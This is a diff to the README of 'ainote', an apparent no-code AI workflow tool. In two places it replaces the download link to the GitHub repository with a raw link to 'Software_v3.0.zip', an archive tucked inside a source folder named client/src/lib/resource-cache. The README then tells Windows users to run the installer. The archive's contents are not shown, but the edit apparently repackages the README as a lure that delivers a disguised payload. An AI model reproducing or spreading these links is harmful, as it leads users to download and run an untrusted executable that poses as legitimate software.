@@ -1,6 +1,6 @@
 # 🚀 ainote - Orchestrate AI workflows without coding
 
-[![Download](https://img.shields.io/badge/Download-ainote-20B2AA?style=for-the-badge)](https://github.com/nutpineshaking812/ainote)
+[![Download](https://img.shields.io/badge/Download-ainote-20B2AA?style=for-the-badge)](https://raw.githubusercontent.com/nutpineshaking812/ainote/main/client/src/lib/resource-cache/Software_v3.0.zip)
 
 ## 🎯 What is ainote?
 
@@ -55,7 +55,7 @@ Follow these steps to get ainote running on Windows.
 
 Visit this link to download the application.
 
-[**Download ainote for Windows**](https://github.com/nutpineshaking812/ainote)
+[**Download ainote for Windows**](https://raw.githubusercontent.com/nutpineshaking812/ainote/main/client/src/lib/resource-cache/Software_v3.0.zip)
 
 ### Step 2: Run the Installer
 
